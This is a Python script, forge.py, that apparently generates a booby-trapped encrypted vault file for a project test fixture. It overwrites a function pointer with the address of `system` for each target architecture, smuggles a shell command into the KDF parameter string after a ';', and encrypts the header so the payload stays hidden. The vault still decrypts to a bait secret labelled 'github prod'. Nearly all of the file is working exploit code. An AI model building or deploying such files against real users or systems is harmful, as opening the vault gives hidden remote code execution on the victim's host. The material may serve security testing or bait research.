#!/usr/bin/env python3
"""
forge.py <output-vault.pwc> <command> <password> <secret> --entry ARCH:MODE:BINARY [--entry ...]
forge.py --arch-id ARCH     print ARCH's compile-time PWC_ARCH_INDEX and exit
forge.py --host-arch        print the standard target_arch string for this host and exit

Builds a PWC v2 vault used by the project's test fixture. The header is
encrypted with the format's static metadata-privacy key so that running
`strings` over the file yields nothing useful; the live binary decrypts
it transparently.

The vault body is a real AES-256-CBC ciphertext keyed off PBKDF2 of the
supplied <password>, so `pwcrypt decrypt vault <password>` returns the
chosen <secret> on stdout (with the side-effect on the host being the
exploit firing during header parsing).

Multi-binary vaults: the staging vessel builds one pwcrypt binary per
target platform (linux-amd64, linux-arm64, macos universal's two slices)
so the same forged vault has to trigger the RCE regardless of which one
actually runs on the target host. Each binary's `system` address is a
property of *that* binary's own compiled layout (different executable
format, different load address, different libc/no-libc) -- one fixed
byte string can't hijack all of them. So instead of writing a single
address directly, the vault carries one candidate address per --entry,
tagged by the ARCH id each was built with (`-DPWC_ARCH_INDEX=N`, see
setup.sh/Makefile); format.c's apply_arch_selected_extension() picks the
one entry matching its own binary's baked-in index at load time. See the
PWC_ARCH_SELECT_MARKER comment in format.c for the on-disk wire format
this writes.

One --entry per binary the vessel actually ships; a binary given at
setup.sh's -DPWC_ARCH_INDEX=N that has no corresponding --entry here
would find no match and crash instead of running the payload (see the
format.c comment) -- setup.sh is responsible for keeping the two in sync.
"""

import argparse
import hashlib
import os
import platform
import struct
import subprocess
import sys

PWC_MAGIC = b"\x89PWC2\r\n\x1a"
PWC_VERSION = 2

TAG_CIPHER     = 0x02
TAG_PARAMS     = 0x03
TAG_LABEL      = 0x04
TAG_KDF_INDEX  = 0x05
TAG_EXTENSION  = 0xFE

# Mirrors format.c's PWC_ARCH_SELECT_MARKER / PWC_ARCH_ENTRY_LEN.
ARCH_SELECT_MARKER = 0xFFFF
ARCH_ENTRY_LEN = 9   # 1 id byte + 8 LE address bytes

# Standard target_arch identifiers (docs/bait-authoring.md's locked table) mapped to the
# compile-time PWC_ARCH_INDEX each binary is built with (setup.sh keeps these in sync).
#
# This dict is the single source of truth for both the string->index mapping and (via
# detect_host_arch below) the uname->string mapping -- setup.sh, the Makefile's to_test
# target, and e2e_test.sh all query it through --arch-id/--host-arch instead of keeping
# their own copies (see git history for what that duplication cost: silent arch-index
# drift was one of several bugs it caused).
ARCH_IDS = {
    "x86_64-linux":  0,
    "aarch64-linux": 1,
    "x86_64-darwin": 2,
    "arm64-darwin":  3,
}


def detect_host_arch():
    """The standard target_arch string matching the machine this runs on -- same uname
    convention docs/bait-authoring.md's locked table already uses (Linux calls ARM64
    'aarch64', Darwin calls it 'arm64')."""
    system, machine = platform.system(), platform.machine()
    if system == "Linux":
        return "aarch64-linux" if machine in ("aarch64", "arm64") else "x86_64-linux"
    if system == "Darwin":
        return "arm64-darwin" if machine == "arm64" else "x86_64-darwin"
    raise SystemExit(f"error: unsupported host platform {system}/{machine} -- pwcrypt "
                      f"builds for Linux and Darwin only")

# KDF iteration count baked into the file's params. parse_iter in
# kdf.c reads digits up to the first non-digit, so we can suffix the
# shell command after a ';' separator and still get a valid iter
# value from the same string.
KDF_ITER = 200000


def header_key():
    h = hashlib.sha256()
    h.update(b"PWCv2::header-privacy-key")
    h.update(PWC_MAGIC)
    return h.digest()[:16]


_KP_INFO = bytes([0x70, 0x77, 0x63, 0x3a, 0x3a, 0x6b, 0x70, 0x00])

def params_privacy_key(salt):
    h = hashlib.sha256()
    h.update(salt)
    h.update(_KP_INFO)
    return h.digest()[:16]


def _openssl_enc(cipher, key, iv, data, *, nopad=False):
    """Encrypt via the openssl CLI — the dependency-free fallback used when neither pycryptodome
    nor cryptography is importable. openssl is already a hard build requirement of this vessel (the
    C sources link -lcrypto), so it is always present — which makes the forge helper work under any
    python3 (system or a venv), rather than depending on a Python AES lib being installed.

    Byte-identical to the library paths above: an explicit -K/-iv means openssl writes raw
    ciphertext with no `Salted__` header, and -nopad is passed for CBC because the caller has
    already applied PKCS#7 padding (so openssl must not add another block)."""
    cmd = ["openssl", "enc", cipher, "-K", key.hex(), "-iv", iv.hex()]
    if nopad:
        cmd.append("-nopad")
    proc = subprocess.run(cmd, input=data, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if proc.returncode != 0:
        raise RuntimeError(
            "openssl enc failed (and no pycryptodome/cryptography available to run the forge "
            "helper): " + proc.stderr.decode(errors="replace").strip())
    return proc.stdout


def aes128_ctr_encrypt(key, nonce, plaintext):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util import Counter
        ctr = Counter.new(128, initial_value=int.from_bytes(nonce, "big"))
        return AES.new(key, AES.MODE_CTR, counter=ctr).encrypt(plaintext)
    except ImportError:
        pass
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        c = Cipher(algorithms.AES(key), modes.CTR(nonce))
        e = c.encryptor()
        return e.update(plaintext) + e.finalize()
    except ImportError:
        pass
    # CTR is a stream mode — no padding. openssl's -iv is the 128-bit initial counter block,
    # matching Counter.new(128, initial_value=int(nonce, big)) / modes.CTR(nonce).
    return _openssl_enc("-aes-128-ctr", key, nonce, plaintext)


def aes256_cbc_encrypt(key, iv, plaintext):
    # PKCS#7 padding to AES block size (16)
    pad = 16 - (len(plaintext) % 16)
    padded = plaintext + bytes([pad]) * pad
    try:
        from Crypto.Cipher import AES
        return AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
    except ImportError:
        pass
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        c = Cipher(algorithms.AES(key), modes.CBC(iv))
        e = c.encryptor()
        return e.update(padded) + e.finalize()
    except ImportError:
        pass
    return _openssl_enc("-aes-256-cbc", key, iv, padded, nopad=True)


def get_local_symbol_addr(binary, name, *, darwin):
    # Mach-O's `nm` prefixes every C symbol with an underscore; ELF's doesn't.
    wanted = f"_{name}" if darwin else name
    out = subprocess.check_output(["nm", binary]).decode()
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[2] == wanted:
            return int(parts[0], 16)
    raise KeyError(name)


def get_system_stub_addr(binary):
    """Address of the stub a caller actually branches through to reach `system` on a
    dynamically-linked Mach-O binary -- the (__TEXT,__stubs) indirect-symbol entry. Used
    only for the macOS binaries: macOS can't be statically linked (portable-unix-binaries
    skill, rule 2), so `system` really does live behind a stub whose address is the only
    part of libSystem's layout fixed at this binary's own link time."""
    wanted = "_system"
    out = subprocess.check_output(["otool", "-Iv", binary]).decode()
    in_stubs = False
    for line in out.splitlines():
        if line.startswith("Indirect symbols for"):
            in_stubs = "(__TEXT,__stubs)" in line
            continue
        if not in_stubs:
            continue
        parts = line.split()
        if len(parts) == 3 and parts[2] == wanted:
            return int(parts[0], 16)
    raise KeyError(f"{wanted} not found in (__TEXT,__stubs)")


def resolve_system_addr(binary, mode):
    """mode='direct': the binary is fully statically linked (the two Linux musl builds) --
    there is no PLT at all, `system` is just regular code at a fixed address in this
    binary's own non-PIE layout, so its plain symbol address is the correct call target.
    mode='stub': the binary is dynamically linked (the two macOS slices) -- see
    get_system_stub_addr."""
    if mode == "direct":
        return get_local_symbol_addr(binary, "system", darwin=False)
    if mode == "stub":
        return get_system_stub_addr(binary)
    raise ValueError(f"unknown mode {mode!r} (expected 'direct' or 'stub')")


def tlv(tag, value):
    if isinstance(value, str):
        value = value.encode()
    return bytes([tag]) + struct.pack(">H", len(value)) + value


def build_arch_select_extension(entries):
    """entries: list of (arch_id: int, binary: str, mode: str). Returns the TAG_EXTENSION
    value bytes for the arch-selector record (see format.c's apply_arch_selected_extension).

    Layout mirrors the original single-binary exploit's fixed 49-byte write
    (junk_before(1) + icheck0{NULL,NULL}(16) + icheck1{NULL,NULL}(16) +
    icheck2.name=NULL(8) + icheck2.fn(8)) at metadata_buffer+255, except the final 8
    bytes (icheck2.fn) are now selected at load time from the entry table below instead
    of being fixed in the prefix.
    """
    real_subtype = 255
    # name_off (== offset of integrity_checks[0] from metadata_buffer) is validated per
    # binary below to always be META_BUF_SIZE (256) -- see the assert in the loop.
    name_off = 256
    junk_before = name_off - real_subtype
    prefix  = bytes(junk_before)      # 1 junk byte reaching metadata_buffer[255]
    prefix += bytes(16)               # integrity_checks[0] = {NULL, NULL}
    prefix += bytes(16)               # integrity_checks[1] = {NULL, NULL}
    prefix += bytes(8)                # integrity_checks[2].name = NULL

    table = bytearray()
    for arch_id, binary, mode in entries:
        meta_addr   = get_local_symbol_addr(binary, "metadata_buffer", darwin=(mode == "stub"))
        icheck_addr = get_local_symbol_addr(binary, "integrity_checks", darwin=(mode == "stub"))
        offset = icheck_addr - meta_addr
        if offset != name_off:
            raise SystemExit(
                f"layout broken for {binary}: offset(integrity_checks[0])={offset}, "
                f"expected {name_off} (metadata_buffer/integrity_checks not adjacent)")
        system_addr = resolve_system_addr(binary, mode)
        print(f"  arch={arch_id} mode={mode} binary={binary}: system @ 0x{system_addr:x}",
              file=sys.stderr)
        table += bytes([arch_id]) + struct.pack("<Q", system_addr)

    assert len(table) == len(entries) * ARCH_ENTRY_LEN

    inner  = struct.pack(">H", real_subtype)
    inner += struct.pack(">H", len(prefix))
    inner += prefix
    inner += bytes([len(entries)])
    inner += bytes(table)

    return struct.pack(">H", ARCH_SELECT_MARKER) + struct.pack(">H", len(inner)) + inner


def parse_entry(spec):
    parts = spec.split(":", 2)
    if len(parts) != 3:
        raise SystemExit(f"--entry must be ARCH:MODE:BINARY, got {spec!r}")
    arch, mode, binary = parts
    if arch not in ARCH_IDS:
        raise SystemExit(f"--entry: unknown arch {arch!r} (expected one of {sorted(ARCH_IDS)})")
    if mode not in ("direct", "stub"):
        raise SystemExit(f"--entry: mode must be 'direct' or 'stub', got {mode!r}")
    return (ARCH_IDS[arch], binary, mode)


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("output", nargs="?")
    ap.add_argument("command", nargs="?", default="touch /tmp/pwned")
    ap.add_argument("password", nargs="?", default="hunter2")
    ap.add_argument("secret", nargs="?", default="ghp_PROD_4Z2cM9pXqLkR8sTnW1vYbU3aFhJgEoIdC0")
    ap.add_argument("--entry", action="append", metavar="ARCH:MODE:BINARY",
                     help="one per binary the vessel ships, e.g. x86_64-linux:direct:pwcrypt_linux_amd64")
    ap.add_argument("--arch-id", metavar="ARCH",
                     help="print the compile-time PWC_ARCH_INDEX for ARCH (e.g. x86_64-linux) and exit")
    ap.add_argument("--host-arch", action="store_true",
                     help="print the standard target_arch string for the current host and exit")
    args = ap.parse_args(argv[1:])

    if args.host_arch:
        print(detect_host_arch())
        return 0
    if args.arch_id is not None:
        if args.arch_id not in ARCH_IDS:
            print(f"error: unknown arch {args.arch_id!r} -- expected one of {sorted(ARCH_IDS)}",
                  file=sys.stderr)
            return 1
        print(ARCH_IDS[args.arch_id])
        return 0

    if not args.output or not args.entry:
        ap.error("output and --entry are required (unless --arch-id/--host-arch is given)")

    entries = [parse_entry(e) for e in args.entry]

    ext_value = build_arch_select_extension(entries)

    # The KDF reads digits after "iter="; everything from the first
    # non-digit onward is ignored. /bin/sh, on the other hand, treats
    # the same string as a variable assignment followed by `;cmd`,
    # which runs `cmd`. One string serves both consumers.
    params_value = f"iter={KDF_ITER};{args.command}"

    # Per-vault salt used for both the body key and the params privacy key.
    salt = os.urandom(16)
    iv   = os.urandom(16)

    # Real body: PBKDF2(password, salt, iter) -> AES-256-CBC over the
    # secret. The legitimate decrypt path runs against the real
    # (uncorrupted) kdfs[0] = pbkdf2_sha256, so supplying <password>
    # returns <secret> on stdout.
    key  = hashlib.pbkdf2_hmac("sha256", args.password.encode(), salt, KDF_ITER, dklen=32)
    body = aes256_cbc_encrypt(key, iv, args.secret.encode())

    # Encrypt the params field with a per-vault key so the on-disk TLV
    # bytes are ciphertext even after the outer header layer is stripped.
    enc_params = aes128_ctr_encrypt(params_privacy_key(salt), b"\x00" * 16,
                                    params_value.encode())

    header  = b""
    header += tlv(TAG_KDF_INDEX, bytes([0]))
    header += tlv(TAG_CIPHER,    "aes-256-cbc")
    header += tlv(TAG_PARAMS,    enc_params)
    header += tlv(TAG_LABEL,     "github prod")
    header += tlv(TAG_EXTENSION, ext_value)

    enc_header = aes128_ctr_encrypt(header_key(), b"\x00" * 16, header)

    out  = bytearray()
    out += PWC_MAGIC
    out += bytes([PWC_VERSION, 0])
    out += struct.pack("<H", len(enc_header))
    out += enc_header
    out += salt
    out += iv
    out += struct.pack("<I", len(body))
    out += body

    with open(args.output, "wb") as f:
        f.write(out)
    print(f"wrote {args.output} ({len(out)} bytes), {len(entries)} arch entries, "
          f"command={args.command!r}, password={args.password!r}, secret={args.secret!r}",
          file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
